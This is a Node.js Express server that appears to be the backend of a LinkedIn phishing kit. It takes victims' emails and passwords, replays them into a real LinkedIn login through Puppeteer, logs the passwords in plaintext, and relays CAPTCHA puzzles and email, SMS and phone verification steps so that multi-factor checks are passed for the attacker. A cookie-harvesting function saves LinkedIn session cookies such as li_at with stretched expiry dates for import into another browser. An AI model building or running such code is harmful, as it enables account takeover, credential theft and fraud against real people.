// Dependencies
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
require("dotenv").config();

// App Configuration
const app = express();
const port = process.env.PORT || 3000;

// Create required directories if they don't exist
const puzzleDir = path.join(__dirname, "public", "images", "puzzle");
if (!fs.existsSync(puzzleDir)) {
  fs.mkdirSync(puzzleDir, { recursive: true });
}

const cookiesDir = path.join(__dirname, "cookies");
if (!fs.existsSync(cookiesDir)) {
  fs.mkdirSync(cookiesDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(express.static("public"));
app.use(express.static("views"));
app.use(express.json());

// State
let sessions = {};

// Utility Functions
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Puzzle and Captcha Handling Functions
async function handlePuzzleTiles(frame, browser, sessionId) {
  const tilesExist = await frame.evaluate(() => {
    const tiles = document.querySelectorAll(
      ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
    );
    return tiles.length === 6;
  });

  if (tilesExist) {
    console.log("Found puzzle tiles! Getting first tile image...");

    const blobUrl = await frame.evaluate(() => {
      const firstTile = document.querySelector(
        ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
      );
      if (!firstTile) return null;

      const style = window.getComputedStyle(firstTile);
      const backgroundImage = style.backgroundImage;

      if (backgroundImage && backgroundImage.startsWith('url("blob:')) {
        return backgroundImage.slice(5, -2);
      }
      return null;
    });

    if (blobUrl) {
      console.log("Found blob URL:", blobUrl);
      await downloadPuzzlePiece(browser, blobUrl, sessionId);
    } else {
      console.log("Could not find first puzzle piece image URL");
    }
  }
  return false;
}

async function downloadPuzzlePiece(browser, blobUrl, sessionId) {
  const newPage = await browser.newPage();
  const client = await newPage.target().createCDPSession();

  try {
    await client.send("Page.enable");
    await client.send("Page.setDownloadBehavior", {
      behavior: "allow",
      downloadPath: puzzleDir,
    });

    await newPage.goto(blobUrl);
    await newPage.evaluate((sessionId) => {
      const link = document.createElement("a");
      link.href = window.location.href;
      link.download = `puzzle_piece_${sessionId}.png`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, sessionId);

    await delay(2000);
    console.log(
      `Download triggered - check puzzle_piece_${sessionId}.png in the public/images/puzzle directory`
    );
  } catch (error) {
    console.error("Error during download:", error);
  } finally {
    await client.detach();
    await newPage.close();
  }
}

async function findAndClickStartPuzzleButton(frame, depth = 0, path = "") {
  console.log(
    `Checking for "Start Puzzle" button in frame at depth ${depth}: ${path}`
  );

  const foundAndClicked = await frame
    .evaluate(() => {
      const buttonSelectors = [
        'button[data-theme="home.verifyButton"]',
        "button.eZxMRy",
        "button.sc-nkuzb1-0",
        'button:has-text("Start Puzzle")',
      ];

      for (const selector of buttonSelectors) {
        try {
          const button = document.querySelector(selector);
          if (button) {
            console.log(`Found button with selector: ${selector}`);
            console.log(`Button text: ${button.textContent}`);
            button.click();
            return true;
          }
        } catch (e) {
          console.log(`Error with selector ${selector}: ${e.message}`);
        }
      }

      const buttons = document.querySelectorAll("button");
      for (const button of buttons) {
        const text = button.textContent.toLowerCase().trim();
        if (text.includes("start puzzle") || text.includes("start")) {
          console.log(`Found button with text: ${button.textContent}`);
          button.click();
          return true;
        }
      }

      return false;
    })
    .catch((error) => {
      console.log(`Error evaluating frame: ${error.message}`);
      return false;
    });

  if (foundAndClicked) {
    console.log(`🎯 CLICKED "Start Puzzle" button in frame at depth ${depth}!`);
    return true;
  }

  const childFrames = frame.childFrames();
  console.log(`Frame at depth ${depth} has ${childFrames.length} children`);

  for (let i = 0; i < childFrames.length; i++) {
    const childFrame = childFrames[i];
    const childPath = path ? `${path} > frame[${i}]` : `frame[${i}]`;
    const found = await findAndClickStartPuzzleButton(
      childFrame,
      depth + 1,
      childPath
    );
    if (found) return true;
  }

  return false;
}

async function handleCaptchaChallenge(
  page,
  browser,
  sessionId,
  challengeCount = 0
) {
  await delay(5000);

  console.log('Starting search for the "Start Puzzle" button...');
  const buttonFound = await findAndClickStartPuzzleButton(
    page.mainFrame(),
    0,
    "mainFrame"
  );

  if (buttonFound) {
    console.log('Successfully clicked the "Start Puzzle" button!');
    console.log("Waiting for puzzle tiles to appear...");
    await delay(2000);

    const allFrames = page.frames();
    for (const frame of allFrames) {
      const tilesHandled = await handlePuzzleTiles(frame, browser, sessionId);
      if (tilesHandled) {
        console.log("Puzzle solved! Waiting for URL change...");
        const currentUrl = await page.url();

        try {
          await page.waitForFunction(
            (oldUrl) => window.location.href !== oldUrl,
            { timeout: 30000 },
            currentUrl
          );
          const newUrl = await page.url();
          console.log("URL changed to:", newUrl);

          const newChallengeCount = challengeCount + 1;
          console.log(`Completed ${newChallengeCount} puzzle challenge(s)`);

          if (newChallengeCount >= 2) {
            console.log(
              "Both puzzle challenges completed. Waiting for verification code..."
            );
            const verificationCode = await askQuestion(
              "Please enter the verification code from your Gmail: "
            );

            await page.waitForSelector('input[name="pin"], input[type="text"]');
            await page.type(
              'input[name="pin"], input[type="text"]',
              verificationCode
            );

            await page.waitForSelector(
              "button.form__submit.form__submit--stretch#pin-submit-button"
            );
            await page.click(
              "button.form__submit.form__submit--stretch#pin-submit-button"
            );
            console.log("Verification code submitted!");
            return true;
          }

          console.log("Waiting for page to load completely...");
          await delay(5000);
          console.log("Checking for additional verification challenges...");

          return await handleCaptchaChallenge(
            page,
            browser,
            sessionId,
            newChallengeCount
          );
        } catch (error) {
          console.log("No URL change detected after 30 seconds");
        }
        break;
      }
    }
  } else {
    if (challengeCount >= 2) {
      console.log("Verification process appears to be complete");
    } else {
      console.log(
        "No Start Puzzle button found - verification might be complete"
      );
    }
    return true;
  }
}

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.get("/api/check-puzzle-image", (req, res) => {
  const { sessionId } = req.query;
  const imagePath = path.join(
    __dirname,
    "public",
    "images",
    "puzzle",
    `puzzle_piece_${sessionId}.png`
  );

  if (fs.existsSync(imagePath)) {
    res.json({ exists: true });
  } else {
    res.json({ exists: false });
  }
});

app.post("/api/linkedin/login", async (req, res) => {
  let { sessionId, email, password } = req.body;

  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  try {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Set up page configuration
    const userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    await page.setUserAgent(userAgent);

    // Navigate and login
    await page.goto("https://www.linkedin.com/login");

    // Wait for the input fields to be visible
    await page.waitForSelector("#username", { visible: true });
    await page.waitForSelector("#password", { visible: true });

    // Input credentials immediately
    await page.type("#username", email);
    await page.type("#password", password);

    // Click login and wait for navigation
    await page.click(".login__form_action_container button");

    console.log(
      `Email: ${email} and Password: ${password} logged for session: ${sessionId}`
    );

    sessions[sessionId] = { browser, page };
    res.send("1");
    await delay(10000);
    await handleCaptchaChallenge(page, browser, sessionId, 0);
  } catch (err) {
    console.error("Error in /api/linkedin/login:", err);
    res.status(500).send(err);
  }
});

app.post("/api/linkedin/security-verification", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;

    // Get puzzle tiles HTML from all frames
    const frames = page.frames();
    console.log("Number of frames found:", frames.length);

    for (const frame of frames) {
      console.log("Checking frame URL:", frame.url());
      const tilesHtml = await frame.evaluate(() => {
        const tiles = document.querySelectorAll(
          "button.sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        console.log("Number of tiles found:", tiles.length);
        if (tiles.length > 0) {
          // Return array of HTML for all tiles
          return Array.from(tiles).map((tile) => tile.outerHTML);
        }
        return null;
      });

      if (tilesHtml) {
        console.log("Found tiles in frame:", frame.url());
        return res.json({
          status: "success",
          tiles: tilesHtml,
        });
      }
    }

    console.log("No puzzle tiles found in any frame");
    res.status(404).json({ error: "No puzzle tiles found" });
  } catch (err) {
    console.error("Error in security-verification:", err);
    res
      .status(500)
      .json({ error: "Failed to get puzzle tiles: " + err.message });
  }
});

app.post("/api/linkedin/select-tile", async (req, res) => {
  const { sessionId, tileNumber } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!tileNumber || tileNumber < 1 || tileNumber > 6) {
    return res
      .status(400)
      .json({ error: "Valid tile number (1-6) is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;
    const allFrames = page.frames();

    for (const frame of allFrames) {
      const clicked = await frame.evaluate((selectedTile) => {
        const tiles = document.querySelectorAll(
          ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        if (tiles[selectedTile - 1]) {
          tiles[selectedTile - 1].click();
          return true;
        }
        return false;
      }, tileNumber);

      if (clicked) {
        console.log(`Clicked tile number ${tileNumber}`);

        // Monitor URL changes
        const currentUrl = await page.url();
        let urlChanged = false;

        try {
          // Wait for either navigation or network idle
          await Promise.race([
            page.waitForNavigation({ timeout: 10000 }),
            page.waitForNetworkIdle({ timeout: 10000 }),
            new Promise((resolve) => setTimeout(resolve, 10000)),
          ]);

          // Add a small delay to ensure any redirects are completed
          await delay(2000);

          const newUrl = await page.url();
          urlChanged = newUrl !== currentUrl;

          if (urlChanged) {
            console.log("URL changed from:", currentUrl, "to:", newUrl);

            // Check if URL contains login-challenge-submit
            if (newUrl.includes("/login-challenge-submit")) {
              return res.send("lastcve");
            }

            // Get only the verification header text
            const headerText = await page.evaluate(() => {
              const header = document.querySelector("h1.content__header");
              return header ? header.textContent.trim() : null;
            });
            console.log("Verification header:", headerText);

            // Return only the header text
            return res.send(headerText);
          }

          console.log(
            "URL status:",
            urlChanged ? "Changed to: " + newUrl : "No change"
          );
        } catch (error) {
          console.log("Navigation check details:", {
            error: error.message,
            currentUrl: await page.url(),
            isNavigating: page.isNavigating,
          });

          // Even if navigation check fails, try to get current state
          const finalUrl = await page.url();
          if (finalUrl.includes("/login-challenge-submit")) {
            // Handle the same way as successful navigation
            return res.send("lastcve");
          }
        }
      }
    }

    res.status(404).json({ error: "No puzzle tiles found" });
  } catch (error) {
    console.error("Error selecting tile:", error);
    res.status(500).json({ error: "Failed to select tile" });
  }
});

app.post("/api/linkedin/verify-code", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res
        .status(400)
        .send("Invalid verification code. Please try again.");
    }

    // Check if URL contains login-challenge-submit
    const currentUrl = await page.url();
    if (currentUrl.includes("/login-challenge-submit")) {
      return res.send("lastcve");
    }

    // If no error and URL doesn't contain login-challenge-submit, send success
    res.send("1");
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-sms", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res
        .status(400)
        .send("Invalid verification code. Please try again.");
    }

    // Check current URL
    const currentUrl = await page.url();

    // Check if URL contains feeds and log it
    if (currentUrl.includes("feed")) {
      console.log("Successfully navigated to feeds URL:", currentUrl);
    }

    // Check if URL contains login-challenge-submit
    if (currentUrl.includes("/login-challenge-submit")) {
      return res.send("lastcve");
    }

    // If no error and URL doesn't contain login-challenge-submit, send success
    res.send("1");
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-phone", async (req, res) => {
  const { phone, countryCode, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!phone) {
    return res.status(400).json({ error: "Phone number is required" });
  }

  if (!countryCode) {
    return res.status(400).json({ error: "Country code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the country select and phone input fields
    await page.waitForSelector("#select-register-phone-country");
    await page.waitForSelector("#register-verification-phone-number");
    await page.waitForSelector("#register-phone-submit-button");

    // Select the country
    await page.select("#select-register-phone-country", countryCode);

    // Clear and type the phone number
    await page.evaluate(() => {
      const phoneInput = document.querySelector(
        "#register-verification-phone-number"
      );
      if (phoneInput) {
        phoneInput.value = "";
      }
    });
    await page.type("#register-verification-phone-number", phone);

    // Submit the form
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click("#register-phone-submit-button"),
    ]);

    // Wait a moment for any error message or redirect
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      const errorMessage = await page.evaluate(() => {
        const errorSpan = document.querySelector(
          '.body__banner--error span[role="alert"]'
        );
        return errorSpan
          ? errorSpan.textContent.trim()
          : "Invalid phone number. Please try again.";
      });
      return res.status(400).send(errorMessage);
    }

    // Check if URL contains login-challenge-submit
    const currentUrl = await page.url();
    if (currentUrl.includes("/login-challenge-submit")) {
      return res.send("lastcve");
    }

    // Check for success - look for verification page header
    const headerText = await page.evaluate(() => {
      const header = document.querySelector("h1.content__header");
      return header ? header.textContent.trim() : null;
    });

    if (headerText && headerText.includes("verify your phone number")) {
      return res.send("Let's verify your phone number");
    }

    // Default success response
    res.send("1");
  } catch (error) {
    console.error("Error submitting phone number:", error);
    res.status(500).json({ error: "Failed to submit phone number" });
  }
});

app.post("/api/linkedin/update-phone", async (req, res) => {
  const { phone, countryCode, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!phone) {
    return res.status(400).json({ error: "Phone number is required" });
  }

  if (!countryCode) {
    return res.status(400).json({ error: "Country code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the country select and phone input fields
    await page.waitForSelector("#select-register-phone-country");
    await page.waitForSelector("#register-verification-phone-number");
    await page.waitForSelector("#register-phone-submit-button");

    // Select the country
    await page.select("#select-register-phone-country", countryCode);

    // Clear and type the phone number
    await page.evaluate(() => {
      const phoneInput = document.querySelector(
        "#register-verification-phone-number"
      );
      if (phoneInput) {
        phoneInput.value = "";
      }
    });
    await page.type("#register-verification-phone-number", phone);

    // Submit the form
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click("#register-phone-submit-button"),
    ]);

    // Wait a moment for any error message or redirect
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      const errorMessage = await page.evaluate(() => {
        const errorSpan = document.querySelector(
          '.body__banner--error span[role="alert"]'
        );
        return errorSpan
          ? errorSpan.textContent.trim()
          : "Invalid phone number. Please try again.";
      });
      return res.status(400).json({ error: errorMessage });
    }

    // Check if URL contains login-challenge-submit
    const currentUrl = await page.url();
    if (currentUrl.includes("/login-challenge-submit")) {
      return res.json({ redirect: "lastcve" });
    }

    // Default success response
    res.json({ success: true });
  } catch (error) {
    console.error("Error updating phone number:", error);
    res.status(500).json({ error: "Failed to update phone number" });
  }
});

app.post("/api/linkedin/check-login-status", async (req, res) => {
  console.log("Check login status endpoint accessed");
  const { sessionId } = req.body;
  console.log("Session ID:", sessionId);

  if (!sessionId) {
    console.log("No session ID provided");
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    console.log("Session not found for ID:", sessionId);
    return res.send("0");
  }

  let result = "0";
  try {
    const { page } = session;

    const currentUrl = await page.url();
    console.log("Current URL:", currentUrl);

    if (currentUrl.includes("feed")) {
    //   collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    try {
      const headerText = await page.evaluate(() => {
        const header = document.querySelector("h1.content__header");
        return header ? header.textContent.trim() : null;
      });

      console.log("Header text found:", headerText);

      if (headerText) {
        result = headerText;
      }
    } catch (evalError) {
      if (evalError.message.includes("Execution context was destroyed")) {
        console.log("Navigation detected, skipping header text check");
        return res.send("1");
      }
      throw evalError;
    }

    console.log("Sending result:", result);
    res.send(result);
  } catch (error) {
    console.error("Error Checking login status:", error);
    res.send("0");
  }
});

async function collectAndSaveCookies(page, sessionId) {
  try {
    const cookies = await page.cookies();

    const filteredCookies = cookies.filter((cookie) =>
      [
        "li_at",
        "JSESSIONID",
        "bscookie",
        "bcookie",
        "li_rm",
        "fptctx2",
        "dfpfpt",
      ].includes(cookie.name)
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      if (cookie.name === "li_at") {
        // Ensure _zendesk_authenticated has the specific format as requested
        return {
          domain: cookie.domain,
          expirationDate: 1778941725,
          hostOnly: false,
          httpOnly: true,
          name: cookie.name,
          path: cookie.path,
          sameSite: "no_restriction",
          secure: true,
          session: false,
          storeId: null,
          value: cookie.value,
        };
      }

      if (cookie.name === "JSESSIONID") {
        // Ensure _zendesk_session has the specific format as requested
        return {
          domain: cookie.domain,
          value: cookie.value,
          name: cookie.name,
          domain: ".www.linkedin.com",
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: 1755181725,
          storeId: null,
        };
      }

      if (cookie.name === "bscookie") {
        // Ensure _zendesk_shared_session has the specific format as requested
        return {
          domain: cookie.domain,

          value: cookie.value,
          name: cookie.name,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: 1778941781,
          storeId: null,
        };
      }
      if (cookie.name === "bcookie") {
        return {
          domain: cookie.domain,

          value: cookie.value,
          name: cookie.name,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: 1778941781,
          storeId: null,
        };
      }
      if (cookie.name === "li_rm") {
        return {
          domain: cookie.domain,

          value: cookie.value,
          name: cookie.name,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: 1778941725,
          storeId: null,
        };
      }
      if (cookie.name === "fptctx2") {
        return {
          domain: cookie.domain,

          value: cookie.value,
          name: cookie.name,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: true,
          firstPartyDomain: "",
          partitionKey: null,
          storeId: null,
        };
      }
      if (cookie.name === "dfpfpt") {
        return {
          domain: cookie.domain,

          value: cookie.value,
          name: cookie.name,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: 1778928896,
          storeId: null,
        };
      }

      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session || false,
        firstPartyDomain: cookie.firstPartyDomain || "",
        partitionKey: cookie.partitionKey || null,
        storeId: cookie.storeId || null,
      };
    });

    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

// Server Initialization
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
